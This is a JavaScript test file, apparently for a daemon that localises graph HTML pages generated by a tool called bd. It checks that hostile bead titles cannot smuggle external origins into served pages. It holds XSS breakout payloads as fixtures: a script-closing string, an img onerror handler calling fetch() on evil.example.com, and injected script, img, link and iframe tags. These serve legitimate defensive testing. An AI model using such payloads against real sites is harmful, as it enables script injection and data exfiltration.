// Bead titles come from other people's repositories, and Phase A serves `bd`'s
// own generator output. So this file keeps two very different things apart, and
// the separation is the point:
//
//   ASSERTED — a guarantee this daemon makes. `localiseGraphHtml()` refuses to
//   emit a page that still carries a fetchable off-box reference, wherever in
//   the page that reference came from. Breaking that guard must break a test.
//
//   RECORDED — an observation about `bd`, which this repo does not own. How bd
//   escapes a hostile title is pinned here so that a future bd upgrade which
//   changes it shows up as a diff rather than as a surprise. A recorded fact is
//   NOT a claim that bd is correct; it is a tripwire on bd's behaviour, and the
//   comment on each one says which of the two it is.
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { localiseGraphHtml, externalOrigins, D3_CDN_SRC } from '../lib/beads-graph.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

// The payload from the plan: it tries to close bd's inline data script and then
// reach an off-box host from the markup that follows.
const HOSTILE_HANDLER = '</script><img src=x onerror="fetch(\'https://evil.example.com\')">';
// The same breakout, but reaching off-box through a *fetchable attribute* —
// the shape the daemon's guard is built to refuse.
const HOSTILE_SRC = '</script><script src="https://evil.example.com/x.js"></script>';

// A page shaped like bd's: one CDN script tag, then one inline data script whose
// JSON carries the title. `title` is interpolated RAW, i.e. this simulates a bd
// that has stopped escaping — which is the regression the guard exists for.
const unescapedPage = (title) => `<!doctype html><html><head><title>Beads: ${title}</title></head>
<body><svg id="graph"></svg>
<script src="${D3_CDN_SRC}"></script>
<script>const nodes = [{"id":"a","title":"${title}","layer":0}];</script>
</body></html>`;

// ── ASSERTED ────────────────────────────────────────────────────────────────

test('a hostile bead title cannot introduce an external origin into a served page', () => {
  // The guarantee, stated from the consumer's position: if bd ever emits a page
  // where a title has broken out and points off-box, this daemon refuses the
  // whole page instead of serving it. Nothing is returned on refusal, so there
  // is no half-page to fall back on.
  for (const payload of [
    HOSTILE_SRC,
    '</script><img src="http://evil.example.com/p.gif">',
    '</script><link rel="stylesheet" href="https://evil.example.com/s.css">',
    "</script><iframe src='https://evil.example.com/'></iframe>",
  ]) {
    assert.throws(
      () => localiseGraphHtml(unescapedPage(payload)),
      (e) => e.code === 'graph_external_origin',
      `must refuse: ${payload}`,
    );
  }
});

test('the CDN rewrite does not launder a smuggled origin', () => {
  // The rewrite succeeds on the d3 tag in the same page, so "something was
  // rewritten" must never be mistaken for "the page is now local".
  const page = unescapedPage(HOSTILE_SRC);
  assert.ok(page.includes(D3_CDN_SRC), 'fixture must contain the CDN tag the rewrite handles');
  assert.throws(() => localiseGraphHtml(page), (e) => e.code === 'graph_external_origin');

  // Control, so a RED above is attributable to the hostile title and not to the
  // fixture: the same page with a harmless title is accepted and localised.
  const ok = localiseGraphHtml(unescapedPage('a perfectly ordinary bead title'));
  assert.equal(ok.rewrote, 1);
  assert.ok(!ok.html.includes('d3js.org'));
});

// ── RECORDED: the shape of the guard ────────────────────────────────────────

test('RECORD: the guard matches fetchable src/href attributes, not inline handlers', () => {
  // Recorded, not endorsed. `externalOrigins()` reads `src=`/`href=` attribute
  // URLs only, so the plan's `onerror="fetch('https://…')"` payload is NOT
  // refused: the URL sits inside an event-handler attribute, not a src/href.
  //
  // Why that is contained rather than exploitable today, and what would change
  // it: (1) bd escapes the title, so the handler never becomes markup at all —
  // recorded by the bd test below; (2) the graph document is served under
  // `connect-src 'none'; img-src 'none'` (Task 4), so even as live markup the
  // fetch and the image load are blocked. If either of those stops holding,
  // this recorded fact is the place the gap is already written down.
  const origins = externalOrigins(unescapedPage(HOSTILE_HANDLER));
  assert.deepEqual(origins, ['d3js.org'], 'evil.example.com is not seen as an origin here');
  const out = localiseGraphHtml(unescapedPage(HOSTILE_HANDLER));
  assert.equal(out.rewrote, 1);
  assert.ok(out.html.includes('evil.example.com'), 'it survives as text — recorded, not approved');
});

// ── RECORDED: what bd actually does ─────────────────────────────────────────

function bdOnPath() {
  try {
    execFileSync('bd', ['--version'], { stdio: 'pipe', timeout: 15_000 });
    return true;
  } catch {
    return false;
  }
}

function bd(args, cwd) {
  return execFileSync('bd', args, {
    cwd,
    encoding: 'utf8',
    timeout: 120_000,
    env: { ...process.env, BD_NON_INTERACTIVE: '1' },
    stdio: ['ignore', 'pipe', 'pipe'],
    maxBuffer: 16 * 1024 * 1024,
  });
}

test('RECORD: how bd escapes a hostile title in its own output', (t) => {
  if (!bdOnPath()) {
    t.skip('bd is not on PATH — the recorded observation about bd cannot be taken here');
    return;
  }

  // A throwaway repo, never this repo's own .beads: the test creates beads.
  const dir = mkdtempSync(join(tmpdir(), 'lb-graph-inj-'));
  try {
    assert.notEqual(dir, ROOT);
    assert.ok(!dir.startsWith(ROOT), 'the fixture repo must live outside this checkout');

    // `bd -C <dir> init` fails with "no beads project found" — init must run
    // with the directory as cwd. Known gotcha; do not "simplify" this back.
    bd(['init', '--non-interactive', '--prefix', 'inj', '--skip-agents', '--skip-hooks'], dir);
    assert.ok(existsSync(join(dir, '.beads')), 'fixture repo must have its own .beads');

    // Phase 1 — ONE hostile bead. With a single issue, bd names the document
    //   after it, so this is the run that shows the <title> escaping path.
    bd(['create', HOSTILE_HANDLER], dir);
    const solo = bd(['graph', '--all', '--html'], dir);

    // (1) In the document title, bd escapes the angle brackets and the quotes
    //     as HTML entities, so the payload is text and not markup.
    assert.match(solo, /<title>[^<]*&lt;\/script&gt;/, 'title: `</script>` is entity-escaped');
    assert.match(solo, /<title>[^<]*(&#34;|&quot;)/, 'title: the double quote is escaped');
    assert.match(solo, /<title>[^<]*(&#39;|&#x27;)/, 'title: the single quote is escaped');

    // Phase 2 — a second hostile bead, this one aiming at a fetchable attribute.
    //   With more than one issue the document title goes static, so from here on
    //   the observation is about the inline data script, which is where every
    //   bead title lands regardless of how many there are.
    bd(['create', HOSTILE_SRC], dir);
    const html = bd(['graph', '--all', '--html'], dir);
    assert.match(html, /<title>Beads Dependency Graph<\/title>/,
      'recorded: with >1 issue no bead title reaches the document title at all');

    // (2) In the inline JSON node data, bd escapes `<` and `>` as \u003c/\u003e
    //     (Go's HTML-safe JSON encoding), so the data script cannot be closed
    //     from inside a title, and `"` arrives as `\"` — never a bare quote.
    //     That second part is why the src payload never reads as an attribute.
    assert.match(html, /\\u003c\/script\\u003e/, 'data: `</script>` is unicode-escaped');
    assert.match(html, /\\u003cimg src=x/, 'data: the injected img tag is unicode-escaped');
    assert.match(html, /\\u003cscript src=\\"https:\/\/evil\.example\.com/,
      'data: the injected script tag is unicode-escaped and its quotes backslashed');
    assert.ok(!/"title":"[^"]*<\/script>/.test(html), 'data: no raw breakout survives');

    // (3) Whole-document check: every `</script>` present belongs to a real
    //     `<script`, so nothing in a title added one.
    const opens = (html.match(/<script\b/g) || []).length;
    const closes = (html.match(/<\/script>/g) || []).length;
    assert.equal(closes, opens, 'script tags must balance');

    // (4) The parser is the authority on whether the escaping held: parse the
    //     page and look for what the payload was trying to create. Scripts are
    //     not executed by jsdom here.
    const doc = new JSDOM(html).window.document;
    assert.equal(doc.querySelectorAll('img').length, 0, 'no <img> materialised from a title');
    assert.equal(doc.querySelectorAll('iframe').length, 0);
    assert.equal(doc.querySelectorAll('script').length, opens, 'no extra script element');
    // And on the single-issue page, the entity-escaped payload parses back as
    // the original string of TEXT — proof the escaping round-trips, not markup.
    const soloDoc = new JSDOM(solo).window.document;
    assert.ok(soloDoc.title.startsWith(`Beads: ${HOSTILE_HANDLER} (`),
      'the payload parses back as title TEXT, byte for byte, not as markup');
    assert.equal(soloDoc.querySelectorAll('img').length, 0);

    // (5) The consequence for this daemon, recorded: because bd escapes the
    //     bare quote, a hostile title never reads as a src/href attribute, so a
    //     real bd page is accepted and the only origin in it is the CDN. The
    //     literal string `evil.example.com` does survive — as inert text inside
    //     a JSON string. If a future bd stops escaping, the ASSERTED tests above
    //     are what refuses the page.
    assert.deepEqual(externalOrigins(html), ['d3js.org'], 'bd emits exactly one external origin');
    const out = localiseGraphHtml(html);
    assert.equal(out.rewrote, 1);
    assert.ok(!out.html.includes('d3js.org'), 'the CDN reference does not survive localisation');
    assert.ok(out.html.includes('evil.example.com'), 'recorded: it remains as escaped text');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
